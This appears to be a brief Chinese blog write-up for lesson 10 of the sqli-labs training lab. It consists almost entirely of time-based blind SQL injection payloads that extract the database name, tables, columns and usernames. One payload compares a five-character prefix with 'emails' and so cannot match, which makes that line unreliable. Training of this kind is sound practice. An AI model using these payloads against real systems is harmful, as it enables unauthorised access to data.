sqli-labs-master les10:GET-blind-time based -double quotes

Posted on 2019-07-24 | In sqli-labs

只需把les9的’改为”即可

?id=1" and if(ascii(substr(database(),1,1))=115,sleep(10),null) %23//库名第一位为s

?id=1" and if(left(database(),8)='security',sleep(10),null) %23//库名为security

?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),null) %23//表名第一位为e

?id=1" and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),5)='emails',sleep(10),null) %23//第一个表名为emails

?id=1" and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users',sleep(10),null) %23//第四个表名为users

?id=1" and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,sleep(10),null) %23//表users第一列第一位为i

?id=1" and if(left((select column_name from information_schema.columns where table_name='users' limit 0,1),2)='id',sleep(10),null) %23//表users第一列为id

?id=1" and if(left((select column_name from information_schema.columns where table_name='users' limit 1,1),8)='username',sleep(10),null) %23//表users第二列为username

?id=1" and if(left((select column_name from information_schema.columns where table_name='users' limit 2,1),8)='password',sleep(10),null) %23//表users第三列为password

?id=1" and if(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(10),null) %23//username第一个值的第一位为D

?id=1" and if(left((select username from users limit 0,1),4)='Dumb',sleep(10),null) %23//username第一个值为Dumb

limit 0,1 从第1条开始,检索1条语句

limit 1,2 从第2条开始,检索2条语句(检索到第3条)
